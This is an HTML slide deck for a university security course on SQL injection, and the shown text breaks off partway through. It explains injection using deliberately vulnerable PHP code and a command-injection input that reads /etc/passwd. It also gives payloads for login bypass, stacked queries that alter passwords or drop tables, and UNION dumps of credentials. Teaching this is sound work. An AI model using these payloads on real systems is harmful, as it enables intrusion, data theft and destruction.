@@ -1,0 +1,2557 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+        
+
+        <link rel="stylesheet" href="../assets/reveal-js/dist/reveal.css" />
+
+        
+            <link rel="stylesheet" href="../assets/css/slides.css" />
+        
+        
+            <link rel="stylesheet" href="../assets/vs.css" />
+        
+
+        
+            
+        
+            
+        
+    </head>
+    <body>
+        <div class="reveal">
+            <div class="slides">
+                <section data-markdown
+                
+                    data-separator="^\s*---\s*$"
+                
+                    data-separator-vertical="^\s*-v-\s*$"
+                
+                    data-separator-notes="^Notes?:"
+                
+                >
+                    <!-- The markdown must be placed to the whole left to prevent indentation issues like https://github.com/MartenBE/mkslides/issues/52 -->
+                    <textarea data-template>
+<!-- .slide: data-state="front hide-controls" -->
+
+<div id="title">SQL Injection</div>
+
+<div id="subtitle">Data Privacy and Security</div>
+
+<div id="date">Data Science and Management (DASMA)</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# Background on SQL
+
+---
+
+## What is SQL?
+
+<div class="content-center">
+
+**SQL** (Structured Query Language) is the standard declarative language used for querying and managing **relational databases**. Relational databases store data in **tables** consisting of **columns** (attributes) and **rows** (records).
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Sample table `users` storing data of users registered on a website:
+
+| user | password | age |
+|------|----------|-----|
+| admin | 1f4sdge! | 37 |
+| mauro | mkfln34. | 30 |
+| matteo | a4njDa! | 42 |
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-note"><b>NOTE</b>: On real websites you should <b>never</b> store passwords in cleartext!</div>
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-hint"><b>HINT</b>: When doing penetration testing, you should ask yourself: how the website is likely structuring its own database? Also, if the website engine is open source, you can check the source code to understand how it works.</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Relational Database Architecture
+
+<div class="content-center">
+
+A **Database Server** (e.g., MySQL, PostgreSQL, SQLite) can host multiple databases.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Each database contains multiple **schemas** (collections of tables).
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+A user connected to a specific database can only see the schemas of **that** database.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+Tables consist of:
+- **Columns** (attributes): define the type and name of the data
+- **Rows** (instances/records): actual data entries
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Alice | Red |
+| 2 | Bob | Blue |
+| 3 | Charlie | Red |
+| 4 | Diana | Green |
+
+</div>
+
+
+
+</div>
+
+---
+
+## How Web Applications Use Databases
+
+<div class="content-center">
+
+In a typical web application, user data flows through several layers:
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+1. The **user** sends a request (e.g., login form with username and password)
+2. The **web server** (e.g., PHP, Python, Java) receives the request
+3. The server builds a **SQL query** using the data from the request
+4. The query is sent to the **database server** (e.g., MySQL)
+5. The database returns the **result** to the web server
+6. The web server sends a **response** back to the user
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-warning">Step 3 is where things can go <b>very wrong</b> if user input is not handled carefully!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## SELECT: Fetching Records
+
+<div class="content-center">
+
+Consider the `Players` table:
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | MadrHacks |
+
+<div class="fragment" data-fragment-index="0">
+
+The `SELECT` statement retrieves records from one or more tables:
+
+```sql
+SELECT Username, Team FROM Players WHERE ID < 3;
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Result:
+
+| Username | Team |
+|----------|------|
+| Loldemort | TeamItaly |
+| Titto | TRX |
+
+</div>
+
+
+
+</div>
+
+---
+
+## SELECT: Useful Shortcuts and Clauses
+
+<div class="content-center">
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | MadrHacks |
+
+<div class="fragment" data-fragment-index="0">
+
+**`*`** selects **all columns**:
+
+```sql
+SELECT * FROM Players;    -- returns all columns and all rows
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+`ORDER BY` sorts results, `LIMIT` restricts the number of rows returned:
+
+```sql
+SELECT * FROM Players ORDER BY Username LIMIT 2;
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+**`--`** starts an **inline comment** (everything after it on the same line is ignored):
+
+```sql
+SELECT * FROM Players; -- this text is ignored by the database
+```
+
+</div>
+
+
+
+</div>
+
+---
+
+## SELECT: Filtering with LIKE
+
+<div class="content-center">
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | MadrHacks |
+
+<div class="fragment" data-fragment-index="0">
+
+`LIKE` enables **pattern matching**:
+- `%` matches **0 or more** characters
+- `_` matches **exactly 1** character
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+```sql
+SELECT Username, Team FROM Players WHERE Username LIKE '%m_r%';
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+Result:
+
+| Username | Team |
+|----------|------|
+| Lolde**mor**t | TeamItaly |
+| **mar**co | ZenHack |
+
+</div>
+
+
+
+</div>
+
+---
+
+## INSERT: Adding Records
+
+<div class="content-center">
+
+<br>
+
+**Before** — `Players` table:
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | MadrHacks |
+
+<div class="fragment" data-fragment-index="0">
+
+```sql
+INSERT INTO Players (ID, Username, Team)
+VALUES (5, 'Giorgio', 'PWNzerotti');
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**After** — a new row has been added:
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | MadrHacks |
+| **5** | **Giorgio** | **PWNzerotti** |
+
+</div>
+
+
+
+</div>
+
+---
+
+## UPDATE: Modifying Records
+
+<div class="content-center">
+
+<br>
+
+**Before** — `Players` table:
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | MadrHacks |
+| 5 | Giorgio | PWNzerotti |
+
+<div class="fragment" data-fragment-index="0">
+
+```sql
+UPDATE Players SET Team = 'Vecchi' WHERE ID > 3;
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**After** — rows with `ID > 3` have their `Team` changed:
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | **Vecchi** |
+| 5 | Giorgio | **Vecchi** |
+
+</div>
+
+
+
+</div>
+
+---
+
+## DELETE: Removing Rows
+
+<div class="content-center">
+
+**Before** — `Players` table:
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+| 4 | C0mm4nd_ | Vecchi |
+| 5 | Giorgio | Vecchi |
+
+<div class="fragment" data-fragment-index="0">
+
+```sql
+DELETE FROM Players WHERE Team = 'Vecchi';
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**After** — rows matching the condition are removed:
+
+| ID | Username | Team |
+|----|----------|------|
+| 1 | Loldemort | TeamItaly |
+| 2 | Titto | TRX |
+| 3 | marco | ZenHack |
+
+</div>
+
+
+
+</div>
+
+---
+
+## DROP: Removing Tables
+
+<div class="content-center">
+
+**DROP TABLE** removes an **entire table** from the database:
+
+```sql
+DROP TABLE Players;    -- the entire table is gone!
+```
+
+
+
+</div>
+
+---
+
+## UNION: Combining Results
+
+<div class="content-center">
+
+<br>
+
+Two tables:
+
+<div class="columns-container columns-top">
+
+<div class="col">
+
+<table style="display: inline-table; margin-right: 80px;">
+<caption><b>Players</b></caption>
+<tr><th>ID</th><th>Username</th></tr>
+<tr><td>1</td><td>Loldemort</td></tr>
+<tr><td>2</td><td>Titto</td></tr>
+</table>
+
+</div>
+
+<div class="col">
+
+<table style="display: inline-table;">
+<caption><b>Workers</b></caption>
+<tr><th>ID</th><th>Name</th><th>Earn</th></tr>
+<tr><td>1</td><td>Dario</td><td>20000</td></tr>
+<tr><td>2</td><td>Strank</td><td>5000</td></tr>
+</table>
+
+</div>
+
+</div>
+
+<div class="fragment" data-fragment-index="0">
+
+`UNION` combines the results of two `SELECT` statements (must have the **same number of columns**):
+
+```sql
+SELECT Username, 0 AS Earn FROM Players
+UNION
+SELECT Name, Earn FROM Workers;
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Result:
+
+| Username | Earn |
+|----------|------|
+| Loldemort | 0 |
+| Titto | 0 |
+| Dario | 20000 |
+| Strank | 5000 |
+
+</div>
+
+
+
+</div>
+
+---
+
+## JOIN: Combining Tables
+
+<div class="content-center">
+
+<div class="columns-container columns-top">
+
+<div class="col">
+
+<table style="display: inline-table; margin-right: 80px;">
+<caption><b>Players</b></caption>
+<tr><th>ID</th><th>Username</th></tr>
+<tr><td>1</td><td>Loldemort</td></tr>
+<tr><td>2</td><td>Titto</td></tr>
+<tr><td>3</td><td>marco</td></tr>
+</table>
+
+</div>
+
+<div class="col">
+
+<table style="display: inline-table;">
+<caption><b>People</b></caption>
+<tr><th>Name</th><th>Age</th></tr>
+<tr><td>Loldemort</td><td>15</td></tr>
+<tr><td>marco</td><td>24</td></tr>
+<tr><td>Titto</td><td>32</td></tr>
+</table>
+
+</div>
+
+</div>
+
+<div class="fragment" data-fragment-index="0">
+
+`JOIN` combines rows from two tables based on a **related column**:
+
+```sql
+SELECT p.Username, pe.Age
+FROM Players p JOIN People pe ON p.Username = pe.Name
+WHERE p.ID < 3;
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Result:
+
+| Username | Age |
+|----------|-----|
+| Loldemort | 15 |
+| Titto | 32 |
+
+</div>
+
+
+
+</div>
+
+---
+
+## Aggregate Functions and GROUP BY
+
+<div class="content-center">
+
+<div class="columns-container columns-top">
+
+<div class="col">
+
+<table style="display: inline-table; margin-right: 80px;">
+<caption><b>Solves</b></caption>
+<tr><th>Ch_Id</th><th>Username</th></tr>
+<tr><td>2</td><td>Loldemort</td></tr>
+<tr><td>3</td><td>Loldemort</td></tr>
+<tr><td>3</td><td>Titto</td></tr>
+</table>
+
+</div>
+
+<div class="col">
+
+<table style="display: inline-table;">
+<caption><b>Challs</b></caption>
+<tr><th>ID</th><th>Name</th><th>Pts</th></tr>
+<tr><td>1</td><td>Randez Vous</td><td>400</td></tr>
+<tr><td>2</td><td>Where Banana</td><td>50</td></tr>
+<tr><td>3</td><td>XSS</td><td>250</td></tr>
+</table>
+
+</div>
+
+</div>
+
+<div class="fragment" data-fragment-index="0">
+
+Aggregate functions: `COUNT()`, `SUM()`, `AVG()`, `MIN()`, `MAX()`
+
+```sql
+SELECT Username, COUNT(Ch_Id) FROM Solves GROUP BY Username;
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Result:
+
+| Username | COUNT |
+|----------|-------|
+| Loldemort | 2 |
+| Titto | 1 |
+
+</div>
+
+
+
+</div>
+
+---
+
+<div class="content-center">
+
+`HAVING` filters groups (like `WHERE` but for aggregated results):
+
+```sql
+SELECT Username, SUM(c.Pts)
+FROM Solves s JOIN Challs c ON s.Ch_Id = c.ID
+GROUP BY Username HAVING SUM(c.Pts) > 250;
+```
+
+<br/>
+<br/>
+
+
+Result: only **Loldemort** (50 + 250 = 300 > 250)
+
+
+
+</div>
+
+---
+
+## SQL: Full SELECT Syntax Summary
+
+<div class="content-center">
+
+```sql
+SELECT attribute_list | expressions | subqueries
+FROM   tables | views | inline_views
+[WHERE  simple_conditions | subqueries]
+[GROUP BY attribute_group_list]
+[HAVING   group_conditions | subqueries]
+[ORDER BY order_attributes]
+[LIMIT    number]
+```
+
+<br/>
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+<div class="alert alert-note"><b>NOTE</b>: Subqueries (<code>SELECT</code>) can appear almost anywhere: in the <code>SELECT</code> list, in <code>FROM</code>, in <code>WHERE</code>, and in <code>HAVING</code>.</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# The Injection Problem
+
+---
+
+## Mixing Code and Data
+
+<div class="content-center">
+
+Many programs build **commands** (code) by concatenating fixed parts with **user-supplied data**.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+The program **assumes** that the user input will be treated as **data only**...
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+...but what if the user provides input that is **interpreted as code** by the system?
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-warning">This is the root cause of all <b>injection vulnerabilities</b>: the boundary between <b>code</b> and <b>data</b> is <b>not enforced</b>.</div>
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="3">
+
+<div class="alert alert-error">When user-supplied data <b>escapes its intended role</b> and becomes executable code, the attacker gains control!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## RECALL: Command Injection
+
+<div class="content-center">
+
+In **command injection**, a web application passes user input to a **system shell** command:
+
+```php
+<?php
+// The user provides an IP address via the form
+// The server runs the 'ping' command with that IP
+$ip = $_GET["ip"];
+system("ping -c 1 " . $ip);
+?>
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+**Intended** input: `8.8.8.8` ➜ command becomes: `ping -c 1 8.8.8.8`
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**Malicious** input: `8.8.8.8; cat /etc/passwd` ➜ command becomes:
+
+```bash
+ping -c 1 8.8.8.8; cat /etc/passwd
+```
+
+The `;` is **shell syntax**: the user input has **escaped from data into code**!
+
+</div>
+
+
+
+</div>
+
+---
+
+## From Command Injection to SQL Injection
+
+<div class="content-center">
+
+**Command injection** and **SQL injection** share the **same root cause**:
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+| | Command Injection | SQL Injection |
+|-|-------------------|---------------|
+| **Interpreter** | Operating System **Shell** | **Database** engine |
+| **Code** | Shell commands (`ping`, `cat`, ...) | SQL statements (`SELECT`, `DROP`, ...) |
+| **Data** | User-supplied arguments (e.g., IP) | User-supplied values (e.g., username) |
+| **Escape chars** | ; \| \&& \` | \" \' \-\- \; `UNION` |
+| **Root cause** | Data interpreted as shell code | Data interpreted as SQL code |
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-warning">In both cases, the attacker provides input that <b>crosses the boundary</b> from data to code, altering the logic of the command/query.</div>
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-hint">The defense is also the same in spirit: <b>never trust user input</b> and <b>enforce the boundary</b> between code and data.</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## The Injection Pattern
+
+<div class="content-center">
+
+The general pattern behind **every injection attack** is:
+
+1. The application builds a **string** that mixes a fixed **code template** with **user-supplied data**
+2. This string is sent to an **interpreter** (shell, database, browser, ...)
+3. The interpreter **cannot distinguish** between the code and the data
+4. The attacker crafts input that is **parsed as code** rather than data
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Other examples of the same pattern:
+- **Cross-Site Scripting (XSS)**: user data interpreted as HTML/JavaScript by the browser
+- **LDAP Injection**: user data interpreted as LDAP query syntax
+- **Template Injection**: user data interpreted as template engine code
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-hint"><b>OWASP A03:2021 – Injection</b> groups all these vulnerabilities under the same category because they share this fundamental pattern.</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# SQL Injection
+
+---
+
+## SQL Injection in a Nutshell
+
+<div class="content-center">
+
+A **SQL injection** (SQLi) is an input validation vulnerability where **untrusted user input is embedded into a SQL query** sent to the database.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+It is a specific instance of the **injection pattern** we just discussed: user-supplied **data** is interpreted as SQL **code**.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+By providing a carefully crafted payload, an attacker can alter the intended effect of a query and:
+- **Bypass authentication** (log in as any user)
+- Get access to **sensitive data** (dump entire tables)
+- **Tamper** the integrity of data in the database (modify/delete records)
+- Perform **destructive attacks** (e.g., drop tables)
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-note">Reference: <a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP A03:2021 – Injection</a> > SQL Injection</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## A Quick PHP Primer
+
+<div class="content-center">
+
+The examples in this lecture use **PHP**, a popular server-side language for web applications. Here are the key constructs you need to know:
+
+<div class="fragment" data-fragment-index="0">
+
+| PHP Syntax | Meaning |
+|------------|----------|
+| `<?php ... ?>` | PHP code block (everything inside is server-side code) |
+| `$variable` | Variables start with `$` |
+| `.` (dot) | **String concatenation** operator (like `+` in Python/JS) |
+| `$_POST["x"]` | Data sent by the user via an HTML **form** (POST request) |
+| `$_GET["x"]` | Data from the **URL query string** (GET request) |
+| `$_SESSION["x"]` | Data stored in the user's **session** (server-side, persists across pages) |
+| `echo "text"` | Print text to the web page |
+| `// comment` | Single-line comment |
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-note"><b>NOTE</b>: You don't need to learn PHP... just enough to read the examples. SQL injection applies to <b>any</b> language!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## SQL Injection: Vulnerable Login (1/2)
+
+<div class="content-center">
+
+Consider this PHP code implementing a login functionality. First, the server **connects to the database** and **builds the SQL query**:
+
+```php
+<?php
+    // Connect to the database
+    $db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
+
+    // Build the SQL query by concatenating user input
+    // $_POST["user"] and $_POST["password"] come from the login form
+    $query = "SELECT * FROM users WHERE user = '" . $_POST["user"] .
+             "' AND password = '" . $_POST["password"] . "'";
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+<div class="alert alert-warning">The user input (<code>$<i>POST["user"]</code> and <code>$</i>POST["password"]</code>) is <b>directly concatenated</b> into the SQL query string using the <code>.</code> (dot) operator!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## SQL Injection: Vulnerable Login (2/2)
+
+<div class="content-center">
+
+Then the server **executes the query** and checks if a matching user was found:
+
+```php
+    // Send the query to the database and get the result
+    $sth = $db->query($query);
+
+    // Fetch the first matching row (or false if no match)
+    $user = $sth->fetch();
+
+    if ($user !== false) {
+        // A matching row was found: authenticate the user
+        start_session();
+        $_SESSION["user"] = $user["user"]; // store username in session
+    } else {
+        // No match found: login failure
+    }
+?>
+```
+
+<div class="fragment" data-fragment-index="0">
+
+**Summary**: the query checks if the provided username and password match an entry in the database. If a row is returned, the user is authenticated.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-note">The authentication logic is <b>correct</b>: the problem is in <b>how the query is built</b> (string concatenation of user input).</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Understanding the Query Construction
+
+<div class="content-center">
+
+Let's look closely at how the query is built. Recall that `.` concatenates strings in PHP:
+
+<br/>
+
+
+```php
+$query = "SELECT * FROM users WHERE user = '" . $_POST["user"] .
+         "' AND password = '" . $_POST["password"] . "'";
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+The query has a **fixed template** with **two holes** filled by user input:
+
+```
+SELECT * FROM users WHERE user = '[USER_INPUT]' AND password = '[PASS_INPUT]'
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+The developer **assumes** the user input stays inside the single quotes (`'...'`) and is treated as a **string value** (data).
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-warning">But what if the user input <b>contains a single quote</b> <code>'</code>? It would <b>break out</b> of the string and become SQL <b>code</b>!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Legitimate Use Case
+
+<div class="content-center">
+
+The administrator authenticates with his credentials:
+- **user**: `admin`
+- **password**: `1f4sdge!`
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+The resulting query is:
+```sql
+SELECT * FROM users WHERE user='admin' AND password='1f4sdge!'
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+The input stays **inside the quotes** ➜ it is treated as data ➜ the query is correct.
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+The query returns the matching row ➜ the user is authenticated.
+
+</div>
+
+
+
+</div>
+
+---
+
+## Exploit #1: Login Without Password
+
+<div class="content-center">
+
+The attacker uses the following input:
+- **user**: `admin' -- `
+- **password**: `whatever`
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+The resulting query becomes:
+```sql
+SELECT * FROM users WHERE user='admin' -- ' AND password='whatever'
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Let's break this down:
+- The `'` after `admin` **closes the string** that was opened by the query template
+- `--` followed by a space starts an **inline comment**: everything after it is ignored
+- The password check `AND password='whatever'` is **completely removed**!
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-warning"><b>RESULT</b>: The attacker authenticates as the administrator without knowing the password!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Why Did This Work?
+
+<div class="content-center">
+
+The developer intended the query to be:
+
+```
+SELECT * FROM users WHERE user = '[data]' AND password = '[data]'
+                          ^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^
+                          code     data       code       data
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+But the attacker's input contained `'` and `--`, which are **SQL syntax**:
+
+```
+SELECT * FROM users WHERE user = 'admin' -- ' AND password = '...'
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  
+                          code   data    code (comment out rest!)
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+The user input **escaped from its data role** and became SQL code... exactly the same pattern as command injection!
+
+</div>
+
+
+
+</div>
+
+---
+
+## Exploit #2: Alternative Login Bypass
+
+<div class="content-center">
+
+The attacker uses the following input:
+- **user**: `admin`
+- **password**: `' OR password LIKE '%`
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+The resulting query becomes:
+```sql
+SELECT * FROM users WHERE user='admin'
+  AND password='' OR password LIKE '%';
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+- The injected `'` closes the password string early
+- `OR password LIKE '%'` adds a condition that is **always true** (`%` matches any string)
+- The original closing quote `'` from the template is consumed by `LIKE '%`
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-warning"><b>RESULT</b>: The attacker authenticates as the <b>first user</b> in the <code>users</code> table (less control than Exploit #1).</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Exploit #3: Login as Any User
+
+<div class="content-center">
+
+What if we want to log in as **any user** without knowing any password?
+
+- **user**: `' OR 1=1 -- `
+- **password**: `whatever`
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+The resulting query:
+```sql
+SELECT * FROM users WHERE user='' OR 1=1 -- ' AND password='whatever'
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+- `OR 1=1` is **always true** ➜ the `WHERE` clause matches **every row** in the table
+- The password check is commented out
+- The query returns **all users** ➜ the code authenticates as the **first user** returned
+
+</div>
+
+
+
+</div>
+
+---
+
+## Exploit #4: Stacking Queries
+
+<div class="content-center">
+
+If **stacked queries** are enabled in the DB configuration, the attacker can execute **entirely new SQL statements** by using `;` as separator.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+<div class="alert alert-note">This is similar to how <code>;</code> separates commands in the shell for <b>command injection</b>!</div>
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**Adding a new user** to the database:
+- **user**: `'; INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1) -- -`
+
+```sql
+SELECT * FROM users WHERE user='';
+INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1)
+-- -' AND password='whatever'
+```
+
+<br/>
+
+
+</div>
+
+
+
+</div>
+
+---
+
+## Exploit #4: Stacking Queries (cont.)
+
+<div class="content-center">
+
+**Edit the admin password**:
+- **user**: `'; UPDATE users SET password='newpwd' WHERE user='admin' -- -`
+
+```sql
+SELECT * FROM users WHERE user='';
+UPDATE users SET password='newpwd' WHERE user='admin'
+-- -' AND password='whatever'
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+**Drop the users table** (destructive!):
+- **user**: `'; DROP TABLE users -- -`
+
+```sql
+SELECT * FROM users WHERE user='';
+DROP TABLE users
+-- -' AND password='whatever'
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-warning">Stacked queries can cause <b>INSERT</b>, <b>UPDATE</b>, <b>DELETE</b>, and <b>DROP</b>... not just data leaks but full <b>data destruction</b>!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Little Bobby Tables
+
+<div class="content-center">
+
+<div class="cell-center">
+
+<img src="https://imgs.xkcd.com/comics/exploits_of_a_mom.png" style="width: 1200px;" />
+
+</div>
+
+
+
+</div>
+
+<div class="footnotes">
+
+<sup>*</sup> Source: [https://xkcd.com/327/](https://xkcd.com/327/)
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# UNION-Based SQL Injection
+
+---
+
+## A Different Scenario
+
+<div class="content-center">
+
+In the login example, we altered the query **logic** (bypassed authentication). But what if the application **displays query results** to the user?
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+If the results are shown on the page, we can use **UNION-based injection** to **extract data from other tables**!
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Recall that `UNION` combines two `SELECT` results ➜ we can **append our own query** to the original one.
+
+</div>
+
+
+
+</div>
+
+---
+
+## Vulnerable Search Page (1/2)
+
+<div class="content-center">
+
+Consider this vulnerable snippet that searches messages for the logged-in user:
+
+<br/>
+
+
+```php
+<?php
+    // Build a query to search messages for the current user
+    // $_SESSION["user"] = username stored in session after login
+    // $_GET["search"]   = search string from the URL (e.g., ?search=hello)
+    $query = "SELECT sender, content FROM messages WHERE
+             receiver = '" . $_SESSION["user"] . "' AND
+             content LIKE '%" . $_GET["search"] . "%'";
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Again, user input (`$_GET["search"]`) is **directly concatenated** into the query.
+
+</div>
+
+
+
+</div>
+
+---
+
+## Vulnerable Search Page (2/2)
+
+<div class="content-center">
+
+The server then **executes the query** and **displays the results** on the web page:
+
+<br/>
+
+
+```php
+    // Execute the query
+    $sth = $db->query($query);
+
+    // Loop through each result row and display it
+    foreach ($sth as $row) {
+        echo "Sender: " . $row["sender"];   // print sender
+        echo "Content: " . $row["content"]; // print message content
+    }
+?>
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+<div class="alert alert-warning">Since the results are <b>displayed on the page</b>, we can use <code>UNION</code> to make the page show data from <b>any table</b>!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## UNION-Based Attack
+
+<div class="content-center">
+
+The attacker provides the following `search` parameter:
+
+<br/>
+
+
+```
+' UNION SELECT user, password FROM users -- -
+```
+
+<div class="fragment" data-fragment-index="0">
+
+The resulting query:
+```sql
+SELECT sender, content FROM messages
+WHERE receiver='attacker' AND content LIKE '%'
+UNION SELECT user, password FROM users -- - %'
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+The page now displays:
+- The normal messages (from the first `SELECT`)
+- **All usernames and passwords** from the `users` table (from the injected `UNION SELECT`)!
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-warning"><b>IMPORTANT</b>: The two <code>SELECT</code> subqueries must return the <b>same number of columns</b>!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Discovering the Number of Columns
+
+<div class="content-center">
+
+Before using `UNION`, the attacker needs to determine **how many columns** the original query returns.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Two common techniques:
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**Technique 1**: `ORDER BY` with increasing column index until an error occurs:
+```
+' ORDER BY 1 -- -    (OK)
+' ORDER BY 2 -- -    (OK)
+' ORDER BY 3 -- -    (ERROR ➜ the table has 2 columns)
+```
+
+<br/>
+
+
